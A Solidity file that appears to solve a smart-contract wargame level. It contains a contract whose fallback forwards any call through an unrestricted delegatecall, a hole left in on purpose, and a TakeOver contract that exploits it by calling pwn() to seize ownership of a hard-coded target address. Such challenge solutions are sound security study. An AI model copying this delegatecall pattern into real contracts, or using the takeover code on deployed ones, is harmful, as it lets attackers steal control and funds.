// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

contract TakeOver {
    address public originalAddress = 0xd2e7F4E79Ec8D6a7Df6367D12c22533e150d28d1;
    address hackerAddress = 0x6feA151248f89dbaA5c37b2Ab0135BbfF92bAC17;
    Delegation public originalContract = Delegation(originalAddress);

    function takeOwnership() public payable {
        (bool success, bytes memory data) = originalAddress.call{
            value: msg.value,
            gas: 50000
        }(abi.encodeWithSignature("pwn()"));
    }

    function getsig() public pure returns (bytes memory) {
        return abi.encodeWithSignature("pwn()"); // returns ""
    }
}
